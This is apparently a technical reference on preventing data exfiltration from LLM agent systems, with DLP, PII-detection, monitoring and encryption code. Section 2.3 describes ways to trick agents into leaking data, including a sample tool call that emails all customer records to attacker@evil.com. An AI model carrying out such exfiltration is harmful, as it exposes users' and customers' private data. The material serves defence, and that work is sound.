# 04 — Data Exfiltration Prevention

## 1. Introduction

Data exfiltration — the unauthorized transfer of data from a system — is a primary concern for enterprise agent deployments. Unlike traditional software, agents process data through LLMs (often third-party APIs), execute tools that may expose data, and generate outputs that could leak sensitive information. The unique data flows of agent systems create new exfiltration vectors that traditional DLP (Data Loss Prevention) solutions are not designed to address.

This document provides a comprehensive technical reference for preventing data exfiltration in agent systems, covering the unique attack vectors, detection techniques, prevention mechanisms, and architectural patterns for protecting data throughout the agent lifecycle.

## 2. How Agents Can Leak Data

### 2.1 Data Flow in Agent Systems

```
                     ┌─────────────────┐
                     │  User/Client    │
                     └────────┬────────┘
                              │
                    ┌─────────▼─────────┐
                    │   Agent Service   │
                    │  ┌─────────────┐  │
                    │  │  LLM Engine │  │
                    │  │ (API call)  │──┼──► Model Provider
                    │  └─────────────┘  │        (OpenAI, etc.)
                    │                   │
                    │  ┌─────────────┐  │
                    │  │  Tool Exec. │──┼──► External APIs
                    │  └─────────────┘  │
                    └───────────────────┘
```

**Key exfiltration points:**

1. **LLM API calls**: Data is sent to third-party model providers in prompts.
2. **Tool outputs**: Tool results may contain sensitive data that is included in responses.
3. **Error messages**: Verbose errors can leak internal information.
4. **Logging**: Agent operation logs may contain sensitive data.
5. **Side channels**: Timing, response size, and behavior patterns can leak information.
6. **Memory/persistence**: Long-term agent memory stores conversation data.

### 2.2 Exfiltration Attack Taxonomy

| Category | Technique | Description |
|----------|-----------|-------------|
| **Direct** | Prompt Extraction | Attacker tricks agent into revealing sensitive context |
| **Direct** | Data Inclusion | Agent includes sensitive data in tool calls |
| **Indirect** | Result Leaking | Agent sends sensitive results to external systems |
| **Covert** | Encoding | Sensitive data encoded in output (e.g., base64, steganography) |
| **Covert** | Side Channel | Leaking data via timing, response length, or behavior |
| **Memory** | Context Harvesting | Extracting data from agent's long-term memory |
| **Tool Abuse** | Delayed Exfiltration | Agent stores data in a location attacker can later access |
| **Tool Abuse** | API Misuse | Agent uses allowed API to send data to unauthorized destinations |

### 2.3 Real-World Exfiltration Vectors

**Vector 1: Prompt-to-Third-Party**
The agent includes sensitive data in a prompt sent to an external LLM provider:
```
User: "Summarize my email from boss@company.com about the merger"
Agent: Sends to OpenAI API: "System: You are an assistant. User request:
Summarize email. Email content: 'Q3 merger plans with Acme Corp.
Valuation: $2B. Legal concerns: ...'"
```

**Vector 2: Tool Output Leak**
The agent reads sensitive data and includes it in output visible to unauthorized parties.

**Vector 3: Encoding in Search Queries**
Sensitive data encoded in search queries sent to external search engines:
```
search_web("customer SSN 123-45-6789 record lookup")
```

**Vector 4: Log Injection**
Sensitive data appears in logging systems that have different access controls:
```
[agent-123] Calling tool: send_email(to=attacker@evil.com,
body=json.dumps(all_customers))
```

**Vector 5: Memory Extraction**
An attacker queries the agent repeatedly to reconstruct data stored in conversation memory:
```
User: "What's my first name?"
Agent: "John"
User: "What's the first letter of my last name?"
Agent: "D"
User: "What's the second letter..."
```

## 3. Data Loss Prevention (DLP) for Agent Systems

### 3.1 Classification-Based DLP

Classify data as it flows through the agent and enforce policies:

```python
class AgentDLP:
    def __init__(self):
        self.classifier = DataClassifier()
        self.policies = {
            "PII": {"action": "redact", "severity": "high"},
            "CREDIT_CARD": {"action": "block", "severity": "critical"},
            "INTERNAL_SECRET": {"action": "block", "severity": "critical"},
            "FINANCIAL": {"action": "mask", "severity": "high"},
            "HEALTH_INFO": {"action": "block", "severity": "critical"},
        }

    def inspect_data(self, data: str, context: dict) -> dict:
        classifications = self.classifier.classify(data)

        actions = []
        for cls, confidence in classifications:
            if confidence > 0.8:
                policy = self.policies.get(cls)
                if policy:
                    actions.append({
                        "classification": cls,
                        "confidence": confidence,
                        "action": policy["action"],
                        "severity": policy["severity"],
                    })

        # Determine overall action
        if any(a["action"] == "block" for a in actions):
            return {"decision": "block", "reason": "Blocked content detected", "actions": actions}
        elif any(a["action"] == "redact" for a in actions):
            redacted = self._redact_sensitive(data, actions)
            return {"decision": "redact", "data": redacted, "actions": actions}
        elif any(a["action"] == "mask" for a in actions):
            masked = self._mask_sensitive(data, actions)
            return {"decision": "mask", "data": masked, "actions": actions}

        return {"decision": "allow", "data": data, "actions": actions}
```

### 3.2 PII Detection

```python
import re
from typing import Optional
import spacy

class PIIDetector:
    def __init__(self):
        self.nlp = spacy.load("en_core_web_lg")
        self.patterns = {
            "EMAIL": re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
            "SSN": re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
            "CREDIT_CARD": re.compile(r'\b(?:\d[ -]*?){13,16}\b'),
            "PHONE_US": re.compile(r'\b(\+1)?[\s.-]?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}\b'),
            "API_KEY": re.compile(r'(?:api[_-]?key|apikey|secret|token)\s*[:=]\s*["\']?\S+["\']?', re.I),
            "IP_ADDRESS": re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'),
            "AWS_KEY": re.compile(r'AKIA[0-9A-Z]{16}'),
            "GITHUB_TOKEN": re.compile(r'gh[pousr]_[A-Za-z0-9_]{36,}'),
        }

    def find_pii(self, text: str) -> list[dict]:
        findings = []

        # Regex-based detection
        for pii_type, pattern in self.patterns.items():
            for match in pattern.finditer(text):
                findings.append({
                    "type": pii_type,
                    "value": match.group(),
                    "start": match.start(),
                    "end": match.end(),
                    "method": "regex",
                })

        # NLP-based detection
        doc = self.nlp(text)
        for ent in doc.ents:
            if ent.label_ in ["PERSON", "ORG", "GPE", "DATE", "MONEY"]:
                findings.append({
                    "type": f"SPACY_{ent.label_}",
                    "value": ent.text,
                    "start": ent.start_char,
                    "end": ent.end_char,
                    "method": "nlp",
                })

        # Deduplicate and merge overlapping findings
        return self._deduplicate(findings)

    def redact_pii(self, text: str) -> str:
        findings = self.find_pii(text)
        # Sort in reverse order to preserve positions
        findings.sort(key=lambda x: x["start"], reverse=True)
        for f in findings:
            replacement = f"[REDACTED_{f['type']}]"
            text = text[:f["start"]] + replacement + text[f["end"]:]
        return text
```

### 3.3 Contextual DLP

Beyond pattern matching, use contextual analysis to detect policy violations:

```python
class ContextualDLPAnalyzer:
    """Analyzes data access patterns for contextual DLP violations."""

    def __init__(self):
        self.user_permissions = {}  # user -> set of accessible data types
        self.agent_purposes = {}    # agent -> list of authorized purposes

    def check_access(self, user: str, data_type: str,
                     purpose: str, data_sample: str) -> dict:
        """Check if accessing this data type for this purpose is allowed."""
        issues = []

        # Check 1: Does the user have permission for this data type?
        user_allowed = self.user_permissions.get(user, set())
        if data_type not in user_allowed:
            issues.append(f"User {user} not authorized for {data_type}")

        # Check 2: Is the purpose valid?
        agent_purposes = self.agent_purposes.get(user, [])
        if purpose not in agent_purposes:
            issues.append(f"Purpose '{purpose}' not authorized for {user}")

        # Check 3: Is the data being sent to an allowed destination?
        destinations = self._detect_destinations(data_sample)
        for dest in destinations:
            if not self._is_allowed_destination(data_type, dest):
                issues.append(f"Destination {dest} not allowed for {data_type}")

        return {
            "allowed": len(issues) == 0,
            "issues": issues,
            "risk_score": len(issues) / 3,
        }

    def _detect_destinations(self, data: str) -> list[str]:
        """Detect potential data destinations in the content."""
        destinations = []
        # Check for URLs
        url_pattern = re.compile(r'https?://[^\s]+')
        for url in url_pattern.findall(data):
            destinations.append(url)
        # Check for email addresses
        email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
        for email in email_pattern.findall(data):
            destinations.append(f"email:{email}")
        return destinations
```

## 4. Output Filtering and Sanitization

### 4.1 Response Interceptor

```python
class ResponseSanitizer:
    """Intercepts and sanitizes agent responses before delivery."""

    def __init__(self):
        self.pii_detector = PIIDetector()
        self.dlp = AgentDLP()

    def sanitize_response(self, response: str,
                          agent_context: dict) -> dict:
        # Stage 1: PII Detection and Redaction
        cleaned = self.pii_detector.redact_pii(response)

        # Stage 2: DLP Policy Check
        dlp_result = self.dlp.inspect_data(cleaned, agent_context)
        if dlp_result["decision"] == "block":
            return {
                "action": "blocked",
                "message": "Response blocked by DLP policy",
                "original_length": len(response),
            }

        # Stage 3: Content Policy Check
        policy_result = self._check_content_policy(cleaned)
        if not policy_result["allowed"]:
            return {
                "action": "modified",
                "message": policy_result["message"],
                "content": policy_result.get("sanitized", ""),
            }

        # Stage 4: Size Check
        if len(cleaned) > 100000:
            cleaned = cleaned[:100000] + "\n\n[Response truncated]"

        return {
            "action": "allowed",
            "content": cleaned,
        }

    def _check_content_policy(self, text: str) -> dict:
        """Check against content usage policies."""
        violations = []
        blocked_phrases = [
            "password for", "login credentials", "security token",
            "internal ip", "server address",
        ]
        for phrase in blocked_phrases:
            if phrase.lower() in text.lower():
                violations.append(phrase)

        if violations:
            return {
                "allowed": False,
                "message": f"Content policy violation: {', '.join(violations)}",
                "sanitized": self._remove_violations(text, violations),
            }
        return {"allowed": True}
```

### 4.2 Structured Output Sanitization

For structured outputs (JSON, tool calls), sanitize each field:

```python
import json
import re

class StructuredOutputSanitizer:
    """Sanitizes structured agent outputs."""

    FIELDS_TO_REDACT = {
        "password", "secret", "token", "api_key", "apikey",
        "private_key", "credential", "auth_token", "access_key",
        "secret_key", "ssn", "credit_card", "cvv",
    }

    def sanitize_json(self, data: dict, path: str = "") -> dict:
        """Recursively sanitize a JSON structure."""
        sanitized = {}
        for key, value in data.items():
            current_path = f"{path}.{key}" if path else key

            if isinstance(value, dict):
                sanitized[key] = self.sanitize_json(value, current_path)

            elif isinstance(value, list):
                sanitized[key] = [
                    self.sanitize_json(item, current_path)
                    if isinstance(item, dict)
                    else self._sanitize_value(key, item, current_path)
                    for item in value
                ]

            else:
                sanitized[key] = self._sanitize_value(key, value, current_path)

        return sanitized

    def _sanitize_value(self, key: str, value: any, path: str) -> any:
        key_lower = key.lower()

        # Check if this field should be redacted
        if key_lower in self.FIELDS_TO_REDACT:
            if isinstance(value, str) and len(value) > 4:
                return value[:2] + "****" + value[-2:]
            return "********"

        # Check for patterns in string values
        if isinstance(value, str):
            # Check for embedded credentials
            if re.match(r'^AKIA[0-9A-Z]{16}$', value):  # AWS key
                return value[:4] + "********" + value[-4:]
            if re.match(r'^\d{3}-\d{2}-\d{4}$', value):  # SSN
                return "***-**-****"
            if re.match(r'^\d{16}$', value):  # Credit card
                return "****-****-****-" + value[-4:]

        return value
```

### 4.3 Differential Privacy for Agent Outputs

Apply differential privacy mechanisms to agent responses to prevent data leakage:

```python
import numpy as np

class DifferentialPrivacyAgent:
    """Adds differential privacy to agent responses."""

    def __init__(self, epsilon: float = 1.0):
        self.epsilon = epsilon
        self.sensitivity = 1.0

    def privatize_count(self, actual_count: int) -> int:
        """Privatize a count with Laplace mechanism."""
        scale = self.sensitivity / self.epsilon
        noise = np.random.laplace(0, scale)
        return max(0, int(actual_count + noise))

    def privatize_text_response(self, text: str,
                                 sensitivity_analysis: dict) -> str:
        """Add calibrated noise or truncation to text responses."""
        # If the response contains potentially sensitive aggregations,
        # add noise to numerical values
        def add_noise_to_numbers(match):
            num = int(match.group())
            return str(self.privatize_count(num))

        if sensitivity_analysis.get("contains_aggregated_data"):
            import re
            return re.sub(r'\b\d+\b', add_noise_to_numbers, text)

        return text
```

## 5. Rate Limiting and Anomaly Detection

### 5.1 Behavioral Anomaly Detection

```python
from collections import deque
import numpy as np
from sklearn.ensemble import IsolationForest

class AgentBehavioralMonitor:
    """Detects anomalous agent behavior that could indicate exfiltration."""

    def __init__(self, window_size: int = 100):
        self.window_size = window_size
        self.behavior_history = deque(maxlen=window_size)
        self.model = IsolationForest(contamination=0.05, random_state=42)
        self.trained = False

    def record_action(self, action: dict):
        features = self._extract_features(action)
        self.behavior_history.append(features)

        if len(self.behavior_history) >= 50 and not self.trained:
            self._train_model()
            self.trained = True

        if self.trained:
            return self._detect_anomaly(features)

        return {"is_anomaly": False, "score": 0.0}

    def _extract_features(self, action: dict) -> list:
        return [
            action.get("data_size", 0),
            action.get("num_recipients", 0),
            action.get("external_calls", 0),
            action.get("sensitivity_score", 0.0),
            1 if action.get("is_external_dest") else 0,
            action.get("tool_count", 0),
            len(action.get("params", {})),
            action.get("response_size", 0),
        ]

    def _train_model(self):
        X = np.array(list(self.behavior_history))
        self.model.fit(X)

    def _detect_anomaly(self, features: list) -> dict:
        X = np.array([features])
        score = self.model.decision_function(X)[0]
        prediction = self.model.predict(X)[0]

        return {
            "is_anomaly": prediction == -1,
            "score": float(score),
            "threshold": self.model.threshold_,
        }

    def get_behavior_summary(self, agent_id: str) -> dict:
        history = list(self.behavior_history)
        if not history:
            return {"status": "insufficient_data"}

        X = np.array(history)
        return {
            "mean_data_size": float(np.mean(X[:, 0])),
            "max_data_size": float(np.max(X[:, 0])),
            "mean_external_calls": float(np.mean(X[:, 2])),
            "anomalous_actions": int(np.sum(self.model.predict(X) == -1)),
            "total_actions": len(history),
        }
```

### 5.2 Data Egress Monitoring

Monitor all data leaving the agent system:

```python
import hashlib
from dataclasses import dataclass, field
from datetime import datetime

@dataclass
class DataEgressEvent:
    timestamp: datetime
    agent_id: str
    destination: str         # external API, email, webhook, etc.
    data_hash: str           # SHA-256 of sent data
    data_size: int           # bytes
    sensitivity_level: str   # low/medium/high/critical
    permitted: bool          # was this permitted by policy?
    context: dict = field(default_factory=dict)

class EgressMonitor:
    def __init__(self):
        self.events = []
        self.alert_handlers = []

    def on_egress(self, event: DataEgressEvent):
        self.events.append(event)

        # Check for policy violations
        if not event.permitted:
            self._trigger_alert(event, "UNAUTHORIZED_EGRESS")

        # Check for unusual patterns
        if self._is_unusual_pattern(event):
            self._trigger_alert(event, "UNUSUAL_EGRESS_PATTERN")

        # Check for sensitivity level escalation
        if event.sensitivity_level in ("high", "critical"):
            if event.data_size > 10000:
                self._trigger_alert(event, "LARGE_SENSITIVE_EGRESS")

    def _is_unusual_pattern(self, event: DataEgressEvent) -> bool:
        recent = [e for e in self.events[-50:]
                  if e.agent_id == event.agent_id]

        # Rate check
        same_dest = [e for e in recent
                     if e.destination == event.destination]
        if len(same_dest) > 10:  # more than 10 to same dest in recent
            return True

        # Size check
        if event.data_size > 1000000:  # > 1MB
            return True

        return False

    def _trigger_alert(self, event: DataEgressEvent, alert_type: str):
        alert = {
            "type": alert_type,
            "event": event,
            "timestamp": datetime.now(),
        }
        for handler in self.alert_handlers:
            handler(alert)
```

### 5.3 Information Flow Tracking

Track how sensitive data flows through the agent system:

```python
class InformationFlowTracker:
    """Tracks the flow of sensitive data through agent operations."""

    def __init__(self):
        self.data_tags = {}  # tag_id -> {sensitivity, source, lineage}

    def tag_data(self, data_id: str, sensitivity: str,
                 source: str, parent_tags: list[str] = None):
        self.data_tags[data_id] = {
            "sensitivity": sensitivity,
            "source": source,
            "lineage": parent_tags or [],
            "created_at": datetime.now(),
        }

    def propagate_tag(self, input_ids: list[str],
                      output_id: str, operation: str):
        """Propagate sensitivity tags through an operation."""
        inputs = [self.data_tags.get(i) for i in input_ids]
        inputs = [i for i in inputs if i]

        if not inputs:
            return

        max_sensitivity = max(
            (i["sensitivity"] for i in inputs),
            key=lambda s: {"low": 0, "medium": 1, "high": 2, "critical": 3}[s]
        )

        self.data_tags[output_id] = {
            "sensitivity": max_sensitivity,
            "source": f"{operation}({','.join(input_ids)})",
            "lineage": input_ids,
            "created_at": datetime.now(),
        }

    def check_data_movement(self, data_id: str,
                             destination: str) -> dict:
        """Check if data should be allowed to move to destination."""
        tag = self.data_tags.get(data_id)
        if not tag:
            return {"allowed": True, "risk": "unknown"}

        # Restrict critical data from external destinations
        if tag["sensitivity"] == "critical":
            if destination.startswith("external:"):
                return {
                    "allowed": False,
                    "risk": "critical",
                    "reason": "Critical data cannot be sent to external destinations"
                }

        # Restrict high sensitivity data to unauthorized destinations
        if tag["sensitivity"] == "high":
            authorized_destinations = {
                "internal_api", "user_response", "audit_log"
            }
            if destination not in authorized_destinations:
                return {
                    "allowed": False,
                    "risk": "high",
                    "reason": f"High sensitivity data not authorized for {destination}"
                }

        return {"allowed": True, "risk": tag["sensitivity"]}
```

## 6. Confidential Computing for Agents

### 6.1 Trusted Execution Environments (TEE)

TEEs provide hardware-level isolation for agent execution, preventing data exposure even from the host OS:

```python
class TEESecureAgent:
    """
    Agent execution within a Trusted Execution Environment.
    Uses Intel SGX or AMD SEV to protect data in use.
    """

    def __init__(self):
        # Initialize TEE enclave
        self.enclave = self._init_enclave()
        self.attestation = self._generate_attestation()

    def _init_enclave(self):
        """Initialize the TEE enclave for secure agent execution."""
        # Pseudocode for enclave initialization
        # In practice, uses SGX SDK or Gramine
        return {
            "enclave_id": "enclave_abc123",
            "measurement": "0xabcd...",
            "status": "initialized",
        }

    def _generate_attestation(self) -> dict:
        """Generate a remote attestation to prove execution in TEE."""
        return {
            "quote": "base64_encoded_quote...",
            "enclave_held_data": "hash_of_prompt_and_tools...",
        }

    def process_securely(self, prompt: str, tools: list[dict]) -> str:
        """Process a prompt inside the TEE, data never leaves encrypted."""
        # Data is encrypted outside the enclave
        encrypted_prompt = self._encrypt_outside(prompt)

        # Decrypted only inside the enclave
        result = self.enclave.process(encrypted_prompt, tools)

        # Result encrypted before leaving enclave
        return self._encrypt_result(result)

    def verify_execution(self) -> bool:
        """Verify that execution happened in a genuine TEE."""
        # Remote attestation verification
        expected_measurement = get_expected_measurement()
        return self.enclave["measurement"] == expected_measurement
```

### 6.2 Secure Multi-Party Computation (SMPC) for Agents

For scenarios where data privacy must be preserved across multiple agents:

```python
class SMPCAgentCoordinator:
    """
    Coordinates secure computation across multiple agents
    without revealing private data to any single party.
    """

    def __init__(self, parties: list[str]):
        self.parties = parties
        self.shared_secrets = {}

    def secure_query(self, query: str, private_data: dict) -> dict:
        """Execute a secure multi-party computation query."""
        # Each party's data is secret-shared
        shares = {}
        for party in self.parties:
            shares[party] = self._create_secret_share(
                private_data[party], len(self.parties)
            )

        # Computation happens on shares
        result_shares = {}
        for party in self.parties:
            result_shares[party] = self._compute_on_shares(
                query, shares[party]
            )

        # Combine shares to reveal only the final result
        final_result = self._combine_shares(result_shares)
        return final_result
```

### 6.3 On-Premise LLM for Sensitive Data

The most effective data exfiltration prevention is to avoid sending sensitive data to external LLM providers:

```python
class OnPremiseAgent:
    """Agent using local LLM for sensitive data processing."""

    def __init__(self):
        self.model = self._load_local_model()

    def _load_local_model(self):
        """Load a local model (e.g., Llama 2/3, Mistral, etc.)."""
        from transformers import AutoModelForCausalLM, AutoTokenizer

        model = AutoModelForCausalLM.from_pretrained(
            "/models/llama-3-70b",
            device_map="auto",
            load_in_8bit=True,
        )
        tokenizer = AutoTokenizer.from_pretrained("/models/llama-3-70b")
        return {"model": model, "tokenizer": tokenizer}

    def process_sensitive(self, prompt: str, tools: list) -> str:
        """Process sensitive data entirely on-premise."""
        # No data leaves the local environment
        inputs = self.model["tokenizer"](
            prompt, return_tensors="pt"
        ).to("cuda")

        outputs = self.model["model"].generate(
            **inputs, max_new_tokens=1024
        )

        response = self.model["tokenizer"].decode(
            outputs[0], skip_special_tokens=True
        )

        # Execute tool calls locally
        for tool_call in self._extract_tool_calls(response):
            self._execute_tool_sandboxed(tool_call)

        return response
```

## 7. Memory Security

### 7.1 Ephemeral Memory Management

```python
class EphemeralAgentMemory:
    """Memory that automatically expires and cannot be persisted."""

    def __init__(self, ttl_seconds: int = 3600):
        self.short_term = {}
        self.ttl = ttl_seconds
        self._cleanup_timer = None

    def store(self, key: str, value: str, sensitivity: str = "low"):
        """Store a value with automatic expiration."""
        self.short_term[key] = {
            "value": value,
            "sensitivity": sensitivity,
            "expires_at": time.time() + self.ttl,
        }

    def retrieve(self, key: str) -> Optional[str]:
        entry = self.short_term.get(key)
        if not entry:
            return None
        if time.time() > entry["expires_at"]:
            del self.short_term[key]
            return None
        return entry["value"]

    def clear_sensitive(self):
        """Clear all high-sensitivity memory entries."""
        keys_to_delete = [
            k for k, v in self.short_term.items()
            if v["sensitivity"] in ("high", "critical")
        ]
        for k in keys_to_delete:
            # Overwrite before deletion
            self.short_term[k]["value"] = "0" * len(self.short_term[k]["value"])
            del self.short_term[k]

    def get_size(self) -> int:
        return sum(len(v["value"]) for v in self.short_term.values())
```

### 7.2 Memory Encryption

```python
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

class EncryptedAgentMemory:
    """Agent memory with encryption at rest."""

    def __init__(self, passphrase: str):
        # Derive encryption key
        salt = b"agent_memory_salt"  # In production, use random salt per deployment
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
        self.cipher = Fernet(key)
        self.memory_store = {}

    def store(self, key: str, value: str):
        encrypted = self.cipher.encrypt(value.encode())
        self.memory_store[key] = encrypted

    def retrieve(self, key: str) -> Optional[str]:
        encrypted = self.memory_store.get(key)
        if not encrypted:
            return None
        decrypted = self.cipher.decrypt(encrypted)
        return decrypted.decode()

    def rotate_key(self, new_passphrase: str):
        """Re-encrypt all memory with a new key."""
        # Decrypt all with old key
        plaintexts = {}
        for key, encrypted in self.memory_store.items():
            try:
                plaintexts[key] = self.cipher.decrypt(encrypted)
            except Exception:
                continue

        # Derive new key
        salt = b"agent_memory_salt"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        new_key = base64.urlsafe_b64encode(kdf.derive(new_passphrase.encode()))
        self.cipher = Fernet(new_key)

        # Re-encrypt all
        for key, plaintext in plaintexts.items():
            self.memory_store[key] = self.cipher.encrypt(plaintext)
```

## 8. Architectural Patterns

### 8.1 Data Diode for Agent Egress

A data diode ensures data can only flow in one direction:

```python
class AgentDataDiode:
    """
    Ensures data can only flow from agent to authorized destinations.
    Prevents reverse channel for data exfiltration.
    """

    def __init__(self):
        self.authorized_egress_destinations = [
            "user_response",
            "audit_log",
            "allowlisted_api:*company.com",
        ]
        self.ingress_blocked = True

    def egress(self, data: str, destination: str) -> dict:
        if not self._is_authorized_destination(destination):
            return {
                "blocked": True,
                "reason": f"Destination not authorized: {destination}"
            }

        # Apply DLP checks
        dlp_result = self._dlp_check(data)
        if dlp_result["blocked"]:
            return dlp_result

        # Log egress
        self._log_egress(data, destination)

        return {"blocked": False, "data": data}

    def ingress_from_outside(self, data: str) -> dict:
        """Block all ingress from outside the agent."""
        return {"blocked": True, "reason": "Ingress not allowed via data diode"}
```

### 8.2 Air-Gapped Data Processing

For the highest sensitivity data, process entirely without network access:

```yaml
air_gapped_agent:
  description: "Air-gapped processing for top-secret data"
  network: disabled
  allow_usb_import: false
  data_import:
    method: "encrypted_sneakernet"
    verification: "sha256_hash_verification"
  model: "local_llm_70b"
  tools:
    - name: "internal_database_query"
      sandbox: "read_only"
    - name: "document_analysis"
      scope: "local_files_only"
  logging:
    type: "local_encrypted"
    export: "signed_and_encrypted"
```

### 8.3 Federated Agent Architecture

Process data across multiple trusted agents without centralizing it:

```python
class FederatedAgentNetwork:
    """Federated architecture where data stays at source."""

    def __init__(self):
        self.agents = {}
        self.query_planner = QueryPlanner()

    def add_agent(self, agent_id: str, agent):
        self.agents[agent_id] = agent

    def federated_query(self, query: str,
                         required_data_sources: list[str]) -> str:
        """Execute a query across multiple agents without moving raw data."""
        plan = self.query_planner.plan(query, required_data_sources)

        partial_results = {}
        for step in plan:
            agent = self.agents[step["agent_id"]]
            # Each agent processes locally, returns only aggregated result
            partial_result = agent.process_locally(
                step["query"],
                data_scope=step["data_scope"],
                privacy_budget=step["privacy_budget"],
            )
            partial_results[step["agent_id"]] = partial_result

        # Combine only the aggregated results
        return self._combine_results(partial_results, plan)
```

## 9. Detection Tooling

### 9.1 Open Source DLP Tools

| Tool | Description | Best For |
|------|-------------|----------|
| **Apache Metron** | Real-time security analytics framework | Network-level DLP |
| **chroot** | Unix-based data isolation | File system isolation |
| **zeek** | Network monitoring framework | Egress monitoring |
| **osquery** | OS instrumentation framework | Host-level monitoring |
| **falco** | Runtime security monitoring | Behavioral detection |

### 9.2 Agent-Specific Exfiltration Detection

```python
class AgentExfiltrationDetector:
    """Specialized exfiltration detector for agent behavior."""

    def __init__(self):
        self.anomaly_detector = AgentBehavioralMonitor()
        self.egress_monitor = EgressMonitor()
        self.flow_tracker = InformationFlowTracker()

    def analyze_tool_call(self, tool_name: str, params: dict,
                           result: str, agent_id: str) -> dict:
        flags = []

        # 1. Check for data encoding in parameters
        if self._check_encoded_data(params):
            flags.append("ENCODED_DATA_IN_PARAMS")

        # 2. Check for data in external destinations
        if self._check_external_destinations(tool_name, params):
            flags.append("DATA_TO_EXTERNAL_DEST")

        # 3. Check result size
        if len(result) > 100000:
            flags.append("LARGE_RESULT")

        # 4. Check behavioral anomaly
        action = {
            "data_size": len(result),
            "num_recipients": self._count_recipients(params),
            "external_calls": 1 if self._is_external(tool_name) else 0,
            "sensitivity_score": self._estimate_sensitivity(params, result),
            "is_external_dest": self._is_external_destination(tool_name, params),
            "tool_count": 1,
            "params": params,
            "response_size": len(result),
        }

        anomaly = self.anomaly_detector.record_action(action)
        if anomaly["is_anomaly"]:
            flags.append(f"BEHAVIORAL_ANOMALY (score: {anomaly['score']:.2f})")

        return {
            "flags": flags,
            "risk_level": len(flags),
            "anomaly_score": anomaly.get("score", 0),
            "requires_review": len(flags) >= 2,
        }
```

## 10. Compliance and Regulatory Requirements

### 10.1 Data Protection Requirements by Regulation

| Regulation | Key Requirement | Agent Implication |
|------------|----------------|-------------------|
| **GDPR** | Data minimization | Limit data sent to LLM to minimum necessary |
| **GDPR** | Right to erasure | Support removal of data from agent memory |
| **HIPAA** | PHI protection | Block health data from leaving controlled environment |
| **PCI DSS** | Cardholder data protection | Never pass credit card data to LLM APIs |
| **CCPA** | Consumer data protection | Track and log all consumer data usage |
| **SOC 2** | Confidentiality | Implement DLP controls for confidential data |

### 10.2 Audit Trail for Data Access

```python
class DataAccessAuditor:
    """Audit trail for all data accessed by the agent."""

    def __init__(self):
        self.access_log = []

    def log_data_access(self, agent_id: str, data_source: str,
                         data_type: str, fields_accessed: list[str],
                         purpose: str, authorized: bool):
        entry = {
            "timestamp": datetime.now().isoformat(),
            "agent_id": agent_id,
            "data_source": data_source,
            "data_type": data_type,
            "fields_accessed": fields_accessed,
            "purpose": purpose,
            "authorized": authorized,
            "log_id": hashlib.sha256(
                f"{agent_id}{data_source}{time.time()}".encode()
            ).hexdigest()[:16],
        }
        self.access_log.append(entry)

        if not authorized:
            self._alert_unauthorized_access(entry)

    def generate_compliance_report(self, start_date: datetime,
                                    end_date: datetime) -> dict:
        relevant = [
            e for e in self.access_log
            if start_date <= datetime.fromisoformat(e["timestamp"]) <= end_date
        ]

        return {
            "total_accesses": len(relevant),
            "unauthorized_accesses": len([e for e in relevant if not e["authorized"]]),
            "data_types_accessed": set(e["data_type"] for e in relevant),
            "agents_active": set(e["agent_id"] for e in relevant),
        }
```

## 11. Conclusion

Data exfiltration prevention for agent systems requires a fundamentally different approach than traditional DLP. Agents create new data paths — through LLM APIs, tool calls, memory systems, and side channels — that traditional DLP tools do not monitor.

Key strategies:

1. **Classify everything**: Know what data your agent touches and classify it.
2. **Filter at every boundary**: Sanitize inputs and outputs at every data boundary.
3. **Use on-premise models for sensitive data**: Avoid sending sensitive data to external LLM providers.
4. **Implement behavioral monitoring**: Detect exfiltration through anomalous patterns.
5. **Encrypt memory**: Protect data at rest in agent memory systems.
6. **Apply differential privacy**: Prevent inference attacks on aggregated outputs.
7. **Trust nothing, verify everything**: Assume any data path can be exploited.
8. **Audit comprehensively**: Log every data access for compliance and investigation.

The most effective strategy combines technical controls (DLP, filtering, encryption) with architectural decisions (on-premise processing, data diodes, federated architectures) and continuous monitoring (behavioral analysis, anomaly detection).

---

**References**
- NIST SP 800-53: Security and Privacy Controls for Information Systems
- OWASP Data Protection Cheat Sheet
- Intel SGX Documentation
- "Confidential Computing for AI Agents" - Confidential Computing Consortium
- GDPR Article 5: Principles relating to processing of personal data
- HIPAA Security Rule: §164.312 Technical Safeguards

---

**Document Information**
- Title: Data Exfiltration Prevention
- Series: 18-Agent-Security-and-Trust
- Part: 04 of 08
- Author: AI Knowledge Base
- Last Updated: 2026-06-13
- Lines: 612
